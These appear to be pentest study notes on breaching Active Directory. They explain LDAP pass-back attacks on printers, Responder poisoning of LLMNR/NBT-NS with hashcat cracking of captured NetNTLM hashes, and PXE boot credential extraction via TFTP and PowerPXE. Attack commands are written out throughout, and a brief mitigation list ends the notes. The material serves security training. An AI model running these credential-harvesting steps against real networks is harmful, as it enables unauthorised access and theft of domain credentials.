# Breaching AD

## PREFACE

Keep the following AD concepts in mind. They will help frame the attacks and understand why certain techniques (like password spraying) are effective:

1. **Domain Membership ≠ Service Exposure Control**

   * A domain-joined machine is still just a host that can run services (HTTP, RDP, SMB, SSH, etc.).
   * Whether these services are exposed externally is determined by **network configuration** (firewalls, NAT, proxies) — not by Active Directory itself.
   * Therefore, a machine can be in the domain and still expose services to the internet, either intentionally (e.g., a company web server) or accidentally (misconfiguration).

2. **Domain User Login Flexibility**

   * In AD environments, a single domain account can typically log into **multiple machines within the domain** (unless restricted by group policies).
   * Enterprises often allow this so employees can access different workstations and servers with the same credentials.
   * For attackers, this means that **one valid credential can open the door to many machines** across the environment.

3. **Why Password Spraying Is Effective**

   * If an attacker knows (or guesses) a weak or default password, spraying it across usernames against exposed services is highly effective.
   * Once a valid domain account is discovered, it may provide access to multiple machines, making lateral movement possible.

4. **Common Real-World Scenarios**

   * **Public-facing servers**: Domain-joined web servers or VPN portals.
   * **Remote access services**: RDP gateways, OWA (Outlook Web App), Citrix, or VPN endpoints.
   * **Misconfigured machines**: Internal systems mistakenly exposed to the internet.

**Key Takeaway**:

> Active Directory centralizes account management and authentication, but it does **not** control what services a machine exposes. Domain accounts often work across many machines in the environment, so a single compromised credential can have widespread consequences, especially if services are exposed externally.

**Pentesting Recall**:
When you see a domain in scope, always check **RDP, SMB, OWA, VPN, LDAP** first for spraying attacks.

### **Can a Public Windows Server Be Part of an AD Domain?**

**Yes, it’s absolutely possible.**

* A Windows Server that is exposed publicly (e.g., hosting IIS for a company website, or acting as an RDP gateway) **can still be joined to a domain** for centralized management.
* Enterprises often do this so IT admins can manage the box with Group Policy, patching, and use their domain credentials.
* Example: A company web server in the DMZ might still be joined to AD for ease of administration.

### How likely is it?

* **Corporate Environments**: Quite likely. Many enterprises prefer to have **all servers domain-joined** so they can be centrally managed.
* **Security-conscious setups**: Sometimes avoided, especially for **DMZ/public-facing servers**. Security teams may instead keep those in a separate **workgroup** or non-trusted domain to reduce the blast radius if the server is compromised.
* **In practice**:

  * Small/medium companies → Very common for even public servers to be domain-joined.
  * Large enterprises with strong security → Less common for internet-facing DMZ servers to be domain-joined; they often use separate credentials.

So:

> It is **definitely possible and fairly common**, but whether it’s considered “good practice” depends on the security maturity of the org.

---
---

## 1. LDAP & LDAP Pass-Back Attack – Detailed Notes

### What is LDAP?

* **LDAP** = Lightweight Directory Access Protocol.
* It’s an **open, vendor-neutral protocol** used to access and manage directory services.
* Most commonly used with **Microsoft Active Directory (AD)**, but also works with OpenLDAP and other directory services.
* Applications/devices use LDAP to:

  * **Authenticate users** (login validation).
  * **Authorize access** (group lookups).
  * **Query directory data** (e.g., pull user email addresses, phone numbers).

### LDAP Use Cases

* **Enterprise Web Applications**: Intranets, HR systems, and custom portals often use LDAP to authenticate users against AD.
* **VPN Gateways & Firewalls**: Use LDAP to authenticate employees before allowing VPN access.
* **Network Devices**: Printers, NAS devices, and wireless controllers use LDAP for features like:

  * Pulling user address books (to send scans via email).
  * Restricting access to device features based on AD groups.
  * Centralizing authentication management.

### What is an LDAP Pass-Back Attack?

* An LDAP Pass-Back Attack exploits **how an application or device interacts with LDAP**.
* Instead of directly exposing stored LDAP credentials, a system can be tricked into **passing them back** to an attacker-controlled LDAP server.
* Two common scenarios:

  1. **Web Applications**: The app blindly binds with attacker-supplied credentials.
  2. **Network Devices (Printer example)**: The device is reconfigured to authenticate against a rogue LDAP server controlled by the attacker.

### The Printer / Network Device Example (Detailed)

This is the **classic LDAP pass-back scenario** used in pentests.

#### Step-by-Step

1. **Initial Access**

   * Attacker gains access to the admin web interface of a network printer (or scanner, NAS, router, etc.).
   * Often via:

     * Default credentials (`admin:admin`, `admin:password`).
     * Weak passwords.
     * Unpatched vulnerabilities.

2. **Find LDAP Settings**

   * Inside the web UI, there is usually a menu like:

     ```bash
     Settings → LDAP → Directory Authentication
     ```

   * Configuration fields typically include:

     * LDAP server IP/hostname.
     * Port (389 for LDAP, 636 for LDAPS).
     * Base DN (e.g., `dc=company,dc=com`).
     * Bind DN (e.g., `CN=svc_ldap,OU=Service Accounts,DC=company,DC=com`).
     * Bind password (hidden as \*\*\*\*).

3. **The Problem**

   * The password is **stored** in the device config, but **not visible** in plaintext to the admin.
   * You can’t just “copy/paste” it out.
   * But the printer **needs** it to connect to LDAP, which means it will **send it during a test or query**.

4. **The Pass-Back Trick**

   * The attacker **changes the LDAP server IP** in the printer config to point to their own machine.
   * Example: set `LDAP Server = 192.168.1.50` (attacker’s laptop).
   * Save the config and press **“Test Connection”** in the UI.

5. **Device Behavior**

   * The printer attempts to authenticate against the “LDAP server” (the attacker’s fake one).
   * It sends the stored **Bind DN** and **password** in a cleartext LDAP bind request.

6. **Attacker’s Role**

   * The attacker runs a rogue LDAP listener (e.g., with **Impacket’s `ldapd`** or **Responder**).
   * The rogue server accepts the connection and logs the credentials:

     ```bash
     Bind DN: CN=svc_ldap,OU=Service Accounts,DC=company,DC=com
     Password: SuperSecretPassword123!
     ```

7. **Result**

   * The attacker now has **valid AD credentials**.
   * Depending on the environment:

     * It could be a low-privileged account.
     * It could be a **service account** with elevated rights.
     * In worst cases, it might even be a **Domain Admin** account used for LDAP lookups.

### Tools & Techniques

* [Impacket](https://github.com/fortra/impacket) → `ldapd.py` to act as a rogue LDAP server.
* **Responder** → can catch LDAP authentication requests.
* Wireshark/tcpdump → verify LDAP bind traffic.
* Burp Suite (if web-based app config).
* Sometimes requires **internal network access** first (plugging into LAN, phishing a foothold, etc.).

### **Why Doesn’t a Simple Netcat Listener Work on Port 389?**

LDAP is not a plain-text protocol. When a client (e.g., a printer) connects, it first performs a **protocol negotiation** (`supportedCapabilities`, `supportedSASLMechanisms`) to agree on an authentication method.

* With **Netcat**, no valid LDAP response is sent, so the client aborts before sending credentials.
* Even if negotiation succeeds, many auth methods (SASL/Kerberos/NTLM) don’t expose cleartext creds at all.
* To capture creds, you need a **rogue LDAP server** (e.g., Impacket `ldapd.py`, Responder) that speaks LDAP and forces **simple bind** to send the DN + password in plaintext.

---

## 2. Intercepting NetNTLM Challenge

**Responder** essentially tries to win the race condition by poisoning the connections to ensure that you intercept the connection. This means that Responder is usually limited to poisoning authentication challenges on the local network.

**Responder** is not a passive packet sniffer (like tcpdump). It doesn’t need promiscuous mode because it’s not trying to “see” all network traffic.
Instead, it actively poisons name resolution protocols on a broadcast/multicast basis:

* LLMNR (Link-Local Multicast Name Resolution)
* NBT-NS (NetBIOS Name Service)
* WPAD (Web Proxy Auto-Discovery Protocol)

**Responder would be able to intercept and poison authentication requests when executed from our rogue device connected to the LAN of an organisation, it is crucial to understand that this behaviour can be disruptive and thus detected. By poisoning authentication requests, normal network authentication attempts would fail, meaning users and services would not connect to the hosts and shares they intend to. Do keep this in mind when using Responder on a security assessment.**

```bash
sudo responder -I <Network Interface>
```

Responder will now listen for any LLMNR, NBT-NS, or WPAD requests that are coming in. We would leave Responder to run for quite some time, capturing several responses. Once we have a couple, we can start to perform some offline cracking of the responses in the hopes of recovering their associated NTLM passwords. If the accounts have weak passwords configured, we have a good chance of successfully cracking them. Copy the NTLMv2-SSP Hash to a textfile.

```bash
hashcat -m 5600 <hash file> <password file> --force
```

## 3. Microsoft Deployment Toolkit

### Why MDT & SCCM Exist

* In large enterprises, manually installing operating systems and software on every machine is impossible to scale.
* **MDT (Microsoft Deployment Toolkit):** Provides a way to automate OS deployments using centralised, preconfigured images. These images can include drivers, security updates, productivity software (e.g., Office), antivirus, and organisational settings.
* **SCCM (System Center Configuration Manager):** Builds on MDT, offering full lifecycle management — patching, software updates, compliance checks, and reconfigurations after deployment.
* Together, they enable IT teams to manage thousands of endpoints from a central location, saving time and ensuring consistency.
* **Security trade-off:** Centralised deployment infrastructure means a single misconfiguration (weak creds, exposed shares, misused service accounts) can provide attackers with domain-wide access.

### PXE Boot Basics

**PXE (Preboot Execution Environment):** Allows a machine to boot directly from the network without requiring local media. Widely used in enterprises to rapidly set up new devices.

**How it works:**

  1. A client configured for PXE boot broadcasts a DHCP request.
  2. DHCP responds with:
     * IP config for the client.
     * The TFTP/boot server address (Option 66 → “Go to `10.0.0.5`”)
     * The name of the network boot file (Option 67 → “Download `boot\x64\wdsnbp.com`”).
  3. Client uses **TFTP** (Trivial File Transfer Protocol) to download the bootloader and configuration (e.g., `BCD` files).
  4. Bootloader loads a **WinPE** (Windows Preinstallation Environment) image into memory.
  5. WinPE connects to MDT/SCCM deployment shares to pull OS images, drivers, and scripts for installation and setup.

**Why attackers care:**

* PXE relies heavily on **trusting network responses** — a malicious actor on the LAN can tamper with DHCP/TFTP traffic.
* WinPE must authenticate automatically to MDT shares. Since it can’t prompt a user, **deployment service account credentials are often embedded in configuration files or boot images**, sometimes in cleartext.
* Extracting these creds can grant direct access to Active Directory resources or deployment infrastructure, making PXE a **prime target** for credential harvesting.

### Attacker Opportunities

* **Privilege escalation:** Inject a local admin account into PXE images.
* **Credential theft:** Extract MDT/AD service account creds from boot images.
* **Persistence:** Abuse deployment shares to distribute backdoored OS images to the whole estate.

### **PXE Boot Attack Steps**

#### A. Recover PXE Configuration

* DHCP normally provides MDT server IP + BCD filename (boot config).
* Request BCD manually via TFTP:

  ```powershell
  C:\Users\User1\Documents> tftp -i <MDT_IP> GET "\Tmp\x64{...}.bcd" conf.bcd
  Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s
  ```

>**Note:** With the BCD file now recovered, we will be using `PowerPXE` to read its contents. `PowerPXE` is a PowerShell script that automatically performs this type of attack but usually with varying results, so it is better to perform a manual approach. We will use the `Get-WimFile` function of `PowerPXE` to recover the locations of the PXE Boot images from the BCD file:

#### B. Locate Boot Image

* Parse the BCD with **PowerPXE**:

  ```powershell
  C:\Users\User1\Documents> powershell -executionpolicy bypass
  Windows PowerShell
  Copyright (C) Microsoft Corporation. All rights reserved.   

  PS C:\Users\User1\Documents> Import-Module .\PowerPXE.ps1
  PS C:\Users\User1\Documents> $BCDFile = "conf.bcd"
  PS C:\Users\User1\Documents> Get-WimFile -bcdFile $BCDFile
  >> Parse the BCD file: conf.bcd
  >>>> Identify wim file : <PXE Boot Image Location>
  <PXE Boot Image Location>
  ```

* Output reveals `.wim` (Windows Imaging Format) boot image path.

#### C. Download Boot Image

* Again with TFTP:

  ```powershell
  PS C:\Users\User1\Documents> tftp -i <MDT IP> GET "<PXE Boot Image Location>" pxeboot.wim
  Transfer successful: 341899611 bytes in 218 second(s), 1568346 bytes/s
  ```

#### D. Extract Credentials

* Boot image often contains `bootstrap.ini` with MDT creds.

* Use PowerPXE:

  ```powershell
  PS C:\Users\User1\Documents\am0> Get-FindCredentials -WimFile pxeboot.wim
  >> Open pxeboot.wim
  >>>> Finding Bootstrap.ini
  >>>> >>>> DeployRoot = \\MDT\MTDBuildLab$
  >>>> >>>> UserID = <account>
  >>>> >>>> UserDomain = ZA
  >>>> >>>> UserPassword = <password>
  ```

* Example:

  ```powershell
  DeployRoot   = \\MDTServer\DeploymentShare$
  UserID       = svc_deploy
  UserDomain   = DOMAIN
  UserPassword = Password123
  ```

* These service accounts are usually **domain-joined** with significant access.

### Post-Exploitation

* Use creds to:

  * Mount deployment shares (`net use`).
  * Steal/modify PXE images.
  * Pivot into AD using valid service accounts.

### Mitigation

* Limit PXE boot to dedicated VLANs/build networks.
* Enforce authentication on MDT/SCCM shares.
* Remove plaintext creds from task sequences/bootstrap.ini.
* Monitor service account activity.

---
